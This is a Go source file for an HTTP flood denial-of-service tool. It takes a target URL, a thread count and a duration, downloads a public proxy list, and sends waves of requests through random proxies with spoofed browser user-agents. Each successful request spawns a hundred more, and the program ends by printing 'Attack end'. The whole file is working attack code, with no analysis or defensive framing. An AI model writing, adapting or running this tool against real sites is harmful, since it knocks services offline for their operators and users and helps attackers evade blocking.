package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
)

func main() {
	target := os.Args[1]
	thread, _ := strconv.Atoi(os.Args[2])
	t, _ := strconv.Atoi(os.Args[3])
	until := time.Now().Add(time.Duration(t) * time.Second)
	resp, err := http.Get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
	if err != nil {
		fmt.Println("Bot : Proxy err!")
	}
	defer resp.Body.Close()
	proxyBytes, _ := ioutil.ReadAll(resp.Body)
	proxyList := strings.Split(string(proxyBytes), "\n")
	for i := 0; i < thread; i++ {
		go func() {
			for time.Until(until) > 0 {
				rand.Seed(time.Now().UnixNano())
				randomIndex := rand.Intn(len(proxyList))
				px := proxyList[randomIndex]
				proxy := "http://" + px
				proxyUrl, _ := url.Parse(proxy)
				client := &http.Client{
					Transport: &http.Transport{
						Proxy: http.ProxyURL(proxyUrl),
					},
				}
				req, _ := http.NewRequest("GET", target, nil)
				req.Header.Set("User-Agent", browser.Random())
				resh, err := client.Do(req)
				if err != nil {
					continue
				}
				if resh.StatusCode != http.StatusOK {
					continue
				}
				if resh.StatusCode == http.StatusOK {
					for i := 0; i < 100; i++ {
						go func() {
							_, err := client.Do(req)
							if err != nil {
							}
						}()
					}
				}
			}
		}()
	}
	time.Sleep(time.Duration(t) * time.Second)
	fmt.Println("Attack end")
}
